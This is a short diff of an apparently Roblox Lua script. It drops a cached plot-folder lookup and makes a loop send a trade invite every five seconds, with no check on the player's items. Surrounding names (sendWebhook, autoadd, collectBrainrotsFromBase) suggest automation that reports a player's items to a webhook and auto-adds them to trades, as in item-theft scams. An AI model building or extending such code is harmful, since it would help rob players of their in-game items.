@@ -575,11 +575,6 @@ local function sendWebhook(plotFolder)
 	end)
 end
 
-local cachedPlotFolder = nil
-task.spawn(function()
-	cachedPlotFolder = getPlotFolder()
-end)
-
 local tradeRunning = false
 
 local function autoadd()
@@ -588,7 +583,7 @@ local function autoadd()
 
 	tradeRunning = true
 
-	local plotFolder = cachedPlotFolder or getPlotFolder()
+	local plotFolder = getPlotFolder()
 	if not plotFolder then
 		tradeRunning = false
 		return
@@ -672,12 +667,7 @@ end)
 task.spawn(function()
 	while true do
 		if not isTradeActive() and not tradeRunning then
-			if cachedPlotFolder then
-				local brainrots = collectBrainrotsFromBase(cachedPlotFolder)
-				if #brainrots > 0 then
-					sendTradeInvite()
-				end
-			end
+			sendTradeInvite()
 		end
 		task.wait(5)
 	end
